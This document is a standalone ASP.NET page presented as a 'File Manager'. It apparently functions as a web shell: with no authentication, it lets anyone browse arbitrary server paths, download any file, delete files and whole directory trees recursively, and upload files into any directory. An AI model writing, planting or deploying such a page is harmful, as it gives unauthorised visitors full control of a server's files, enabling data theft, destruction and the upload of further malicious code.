<%@ Page Language="C#" AutoEventWireup="true" %>
<!DOCTYPE html>
<html>
<head><title>File Manager</title></head>
<body>
    <form runat="server">
        <asp:Label ID="lblMessage" runat="server" ForeColor="Red"></asp:Label>
        <br />
        <asp:TextBox ID="txtPath" runat="server" Width="500px"></asp:TextBox>
        <asp:Button ID="btnGo" runat="server" Text="Go" OnClick="btnGo_Click" />
        <br /><br />
        <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" OnRowCommand="gvFiles_RowCommand">
            <Columns>
                <asp:BoundField DataField="Name" HeaderText="Name" />
                <asp:BoundField DataField="Type" HeaderText="Type" />
                <asp:BoundField DataField="Size" HeaderText="Size" />
                <asp:BoundField DataField="LastModified" HeaderText="Last Modified" />
                <asp:TemplateField>
                    <ItemTemplate>
                        <asp:LinkButton ID="lnkDownload" runat="server" Text="Download" CommandName="Download" CommandArgument='<%# Eval("Path") %>' Visible='<%# Eval("IsFile") %>'></asp:LinkButton>
                        <asp:LinkButton ID="lnkDelete" runat="server" Text="Delete" CommandName="Delete" CommandArgument='<%# Eval("Path") %>' OnClientClick="return confirm('Are you sure you want to delete this?');"></asp:LinkButton>
                    </ItemTemplate>
                </asp:TemplateField>
            </Columns>
        </asp:GridView>
        <br />
        <asp:FileUpload ID="fileUpload" runat="server" />
        <asp:Button ID="btnUpload" runat="server" Text="Upload" OnClick="btnUpload_Click" />
    </form>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            try
            {
                string initialPath = Server.MapPath("~/");
                txtPath.Text = initialPath;
                LoadFiles(initialPath);
            }
            catch (Exception ex)
            {
                lblMessage.Text = "Initialization Error: " + ex.Message;
            }
        }
    }

    protected void btnGo_Click(object sender, EventArgs e)
    {
        try
        {
            string path = txtPath.Text.Trim();
            if (Directory.Exists(path))
            {
                LoadFiles(path);
            }
            else
            {
                lblMessage.Text = "Invalid directory path!";
            }
        }
        catch (Exception ex)
        {
            lblMessage.Text = "Go Error: " + ex.Message;
        }
    }

    protected void LoadFiles(string path)
    {
        try
        {
            var files = new List<object>();
            DirectoryInfo dir = new DirectoryInfo(path);

            foreach (var d in dir.GetDirectories())
            {
                files.Add(new
                {
                    Name = d.Name,
                    Type = "Directory",
                    Size = "-",
                    LastModified = d.LastWriteTime.ToString(),
                    Path = d.FullName,
                    IsFile = false
                });
            }

            foreach (var f in dir.GetFiles())
            {
                files.Add(new
                {
                    Name = f.Name,
                    Type = "File",
                    Size = (f.Length / 1024) + " KB",
                    LastModified = f.LastWriteTime.ToString(),
                    Path = f.FullName,
                    IsFile = true
                });
            }

            gvFiles.DataSource = files;
            gvFiles.DataBind();
            txtPath.Text = path;
            lblMessage.Text = "";
        }
        catch (Exception ex)
        {
            lblMessage.Text = "Load Files Error: " + ex.Message;
        }
    }

    protected void gvFiles_RowCommand(object sender, GridViewCommandEventArgs e)
    {
        try
        {
            string path = e.CommandArgument.ToString();
            if (e.CommandName == "Download")
            {
                if (File.Exists(path))
                {
                    Response.Clear();
                    Response.ContentType = "application/octet-stream";
                    Response.AddHeader("Content-Disposition", "attachment; filename=" + Path.GetFileName(path));
                    Response.WriteFile(path);
                    Response.End();
                }
                else
                {
                    lblMessage.Text = "File not found!";
                }
            }
            else if (e.CommandName == "Delete")
            {
                if (File.Exists(path))
                {
                    File.Delete(path);
                    lblMessage.Text = "File deleted successfully!";
                }
                else if (Directory.Exists(path))
                {
                    Directory.Delete(path, true);
                    lblMessage.Text = "Directory deleted successfully!";
                }
                else
                {
                    lblMessage.Text = "Item not found!";
                }
                LoadFiles(txtPath.Text);
            }
        }
        catch (Exception ex)
        {
            lblMessage.Text = "Row Command Error: " + ex.Message;
        }
    }

    protected void btnUpload_Click(object sender, EventArgs e)
    {
        try
        {
            if (fileUpload.HasFile)
            {
                string fileName = Path.GetFileName(fileUpload.FileName);
                string savePath = Path.Combine(txtPath.Text, fileName);
                fileUpload.SaveAs(savePath);
                LoadFiles(txtPath.Text);
                lblMessage.Text = "File uploaded successfully!";
            }
            else
            {
                lblMessage.Text = "Please select a file to upload!";
            }
        }
        catch (Exception ex)
        {
            lblMessage.Text = "Upload Error: " + ex.Message;
        }
    }
</script>
</body>
</html>
